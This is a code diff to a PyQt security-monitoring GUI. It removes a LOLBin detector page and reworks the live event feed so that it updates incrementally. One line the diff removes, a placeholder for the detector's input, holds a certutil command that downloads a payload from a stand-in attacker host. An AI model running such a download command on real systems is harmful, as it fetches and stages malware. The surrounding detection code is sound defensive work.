@@ -714,7 +714,6 @@ class CyberSentinelGUI(QMainWindow):
             ("scan_hash",  self._build_scan_hash_page),
             ("live_edr",   self._build_live_edr_page),
             ("lolbas",     self._build_lolbas_page),
-            ("lolbin",     self._build_lolbin_page),
             ("byovd",      self._build_byovd_page),
             ("chains",     self._build_chains_page),
             ("baseline",   self._build_baseline_page),
@@ -805,7 +804,6 @@ class CyberSentinelGUI(QMainWindow):
             ]),
             ("DETECTORS", [
                 ("🪝  LoLBin Abuse",    "lolbas"),
-                ("🔍  LolbinDetector",  "lolbin"),
                 ("💀  BYOVD Drivers",   "byovd"),
                 ("🔗  Attack Chains",   "chains"),
                 ("📐  Baseline",        "baseline"),
@@ -2090,67 +2088,6 @@ class CyberSentinelGUI(QMainWindow):
                     f"normalized command was also checked.", THEME["muted"]
                 )
 
-    # ── PAGE: LOLBIN DETECTOR ─────────────────────────────────────────────────
-
-    def _build_lolbin_page(self):
-        page = QWidget()
-        layout = QVBoxLayout(page)
-        layout.setContentsMargins(0, 0, 0, 0)
-        layout.setSpacing(0)
-        layout.addWidget(self._page_header(
-            "🔍", "LolbinDetector",
-            "Process-level LOLBAS pattern matching — check any running process name and command line"
-        ))
-
-        inner = QWidget()
-        inner_layout = QVBoxLayout(inner)
-        inner_layout.setContentsMargins(24, 20, 24, 20)
-        inner_layout.setSpacing(12)
-
-        form = QGroupBox("Process Check")
-        form_layout = QVBoxLayout(form)
-        row1 = QHBoxLayout()
-        row1.addWidget(QLabel("Process Name:"))
-        self._lolbin_name = QLineEdit()
-        self._lolbin_name.setPlaceholderText("e.g. certutil.exe")
-        row1.addWidget(self._lolbin_name, 1)
-        form_layout.addLayout(row1)
-        row2 = QHBoxLayout()
-        row2.addWidget(QLabel("Command Line: "))
-        self._lolbin_cmd = QLineEdit()
-        self._lolbin_cmd.setPlaceholderText("e.g. certutil -urlcache -split -f http://evil.com/payload.exe")
-        row2.addWidget(self._lolbin_cmd, 1)
-        form_layout.addLayout(row2)
-        check_btn = QPushButton("🔍  Check Process")
-        check_btn.setObjectName("primary")
-        check_btn.clicked.connect(self._run_lolbin_check)
-        form_layout.addWidget(check_btn)
-        inner_layout.addWidget(form)
-
-        grp = QGroupBox("Detection Result")
-        grp_layout = QVBoxLayout(grp)
-        self._lolbin_result = QTextEdit()
-        self._lolbin_result.setReadOnly(True)
-        self._lolbin_result.setMinimumHeight(200)
-        self._lolbin_result.setStyleSheet(f"background:{THEME['bg']}; color:{THEME['text']}; font-family: Consolas;")
-        grp_layout.addWidget(self._lolbin_result)
-        inner_layout.addWidget(grp, 1)
-
-        layout.addWidget(inner, 1)
-        return page
-
-    def _run_lolbin_check(self):
-        name = self._lolbin_name.text().strip()
-        cmd  = self._lolbin_cmd.text().strip()
-        if not name:
-            self._lolbin_result.setPlainText("⚠  Enter a process name.")
-            return
-        hit = self.lolbin.check(name, cmd)
-        if hit:
-            self._lolbin_result.setPlainText(self.lolbin.format_alert(hit))
-        else:
-            self._lolbin_result.setPlainText(f"✅  No LOLBAS pattern matched for '{name}'.")
-
     # ── PAGE: BYOVD ───────────────────────────────────────────────────────────
 
     def _build_byovd_page(self):
@@ -2319,15 +2256,16 @@ class CyberSentinelGUI(QMainWindow):
         self._event_feed_table.setColumnWidth(0, 155)
         self._event_feed_table.setColumnWidth(1, 160)
         self._event_feed_table.setColumnWidth(2, 60)
-        self._event_feed_table.setFixedHeight(200)
+        self._event_feed_table.setMinimumHeight(320)
         feed_layout.addWidget(self._event_feed_table)
-        inner_layout.addWidget(feed_grp)
+        inner_layout.addWidget(feed_grp, 1)
 
         layout.addWidget(inner, 1)
 
-        # Auto-refresh: poll every 5 s, only redraw when counts change
+        # Auto-refresh: poll every 5 s, run correlation on new events
         self._chains_last_count = -1
         self._feed_last_count   = -1
+        self._feed_newest_ts    = ""   # timestamp of the top row currently displayed
         self._chains_timer = QTimer(self)
         self._chains_timer.timeout.connect(self._auto_refresh_chains)
         self._chains_timer.start(5_000)
@@ -2388,6 +2326,10 @@ class CyberSentinelGUI(QMainWindow):
 
         if feed_count != self._feed_last_count:
             self._feed_last_count = feed_count
+            # If the table was wiped (e.g. test script _clear_events), reset the
+            # high-water mark so _refresh_event_feed does a clean full load
+            if feed_count == 0:
+                self._feed_newest_ts = ""
             self._refresh_event_feed()
             self._refresh_chains()   # run correlation whenever new events arrive
             return
@@ -2397,38 +2339,83 @@ class CyberSentinelGUI(QMainWindow):
             self._refresh_chains()
 
     def _refresh_event_feed(self):
-        """Redraws the raw event_timeline feed panel."""
-        rows = _db_query(
-            "SELECT event_type, detail, pid, timestamp FROM event_timeline "
-            "ORDER BY timestamp DESC LIMIT 30"
-        )
-        t = self._event_feed_table
-        t.setRowCount(0)
-        if not rows:
-            r = t.rowCount(); t.insertRow(r)
-            t.setItem(r, 0, table_item("No events yet.", THEME["muted"]))
-            for i in range(1, 4):
-                t.setItem(r, i, table_item(""))
-            return
+        """Append-only live event feed — never wipes what is already displayed.
 
-        # Colour code by event type
+        On first load (or after a manual correlation sweep) it populates the
+        table with the latest 30 events.  On subsequent auto-refresh ticks it
+        only prepends rows that are newer than the timestamp already sitting at
+        the top of the table, so existing rows are never touched, the analyst's
+        scroll position is completely undisturbed, and there is zero flicker.
+        Rows beyond 30 are trimmed from the bottom.
+        """
         _type_colors = {
-            "LOLBIN_ABUSE":   THEME["orange"],
+            "LOLBIN_ABUSE":    THEME["orange"],
             "LOLBIN_DETECTOR": THEME["orange"],
-            "FILELESS_AMSI":  THEME["yellow"],
-            "C2_CONNECTION":  THEME["red"],
-            "BYOVD_LOAD":     THEME["red"],
-            "DGA_BEACON":     THEME.get("purple", THEME["blue"]),
+            "FILELESS_AMSI":   THEME["yellow"],
+            "C2_CONNECTION":   THEME["red"],
+            "BYOVD_LOAD":      THEME["red"],
+            "DGA_BEACON":      THEME.get("purple", THEME["blue"]),
         }
-        for row_data in rows:
-            etype  = row_data.get("event_type", "—")
-            color  = _type_colors.get(etype, THEME["muted"])
-            r = t.rowCount(); t.insertRow(r)
-            t.setItem(r, 0, table_item(row_data.get("timestamp", ""), THEME["muted"]))
-            t.setItem(r, 1, table_item(etype, color))
-            t.setItem(r, 2, table_item(str(row_data.get("pid") or "—")))
-            t.setItem(r, 3, table_item(row_data.get("detail") or "—", THEME["muted"]))
-        t.resizeRowsToContents()
+        t = self._event_feed_table
+
+        if self._feed_newest_ts:
+            # Incremental path — only fetch events newer than what we already show
+            new_rows = _db_query(
+                "SELECT event_type, detail, pid, timestamp FROM event_timeline "
+                "WHERE timestamp > ? ORDER BY timestamp DESC",
+                (self._feed_newest_ts,)
+            ) or []
+            if not new_rows:
+                return  # nothing new — don't touch the table at all
+
+            # Prepend new rows at position 0 (newest stays at top)
+            for i, row_data in enumerate(new_rows):
+                etype = row_data.get("event_type", "—")
+                color = _type_colors.get(etype, THEME["muted"])
+                t.insertRow(i)
+                t.setItem(i, 0, table_item(row_data.get("timestamp", ""), THEME["muted"]))
+                t.setItem(i, 1, table_item(etype, color))
+                t.setItem(i, 2, table_item(str(row_data.get("pid") or "—")))
+                t.setItem(i, 3, table_item(row_data.get("detail") or "—", THEME["muted"]))
+
+            # Update the high-water mark
+            self._feed_newest_ts = new_rows[0]["timestamp"]
+
+            # Trim rows beyond 30 from the bottom — analyst never sees this happen
+            while t.rowCount() > 30:
+                t.removeRow(t.rowCount() - 1)
+
+            # Resize only the new rows so existing rows aren't re-measured
+            for i in range(len(new_rows)):
+                t.resizeRowToContents(i)
+
+        else:
+            # Initial / full load path — table is empty, populate from scratch
+            rows = _db_query(
+                "SELECT event_type, detail, pid, timestamp FROM event_timeline "
+                "ORDER BY timestamp DESC LIMIT 30"
+            ) or []
+
+            t.setRowCount(0)
+            if not rows:
+                t.insertRow(0)
+                t.setItem(0, 0, table_item("No events yet.", THEME["muted"]))
+                for i in range(1, 4):
+                    t.setItem(0, i, table_item(""))
+                return
+
+            for row_data in rows:
+                etype = row_data.get("event_type", "—")
+                color = _type_colors.get(etype, THEME["muted"])
+                r = t.rowCount(); t.insertRow(r)
+                t.setItem(r, 0, table_item(row_data.get("timestamp", ""), THEME["muted"]))
+                t.setItem(r, 1, table_item(etype, color))
+                t.setItem(r, 2, table_item(str(row_data.get("pid") or "—")))
+                t.setItem(r, 3, table_item(row_data.get("detail") or "—", THEME["muted"]))
+            t.resizeRowsToContents()
+
+            # Record the newest timestamp so future ticks only fetch deltas
+            self._feed_newest_ts = rows[0]["timestamp"]
 
     # ── PAGE: BASELINE ────────────────────────────────────────────────────────
 
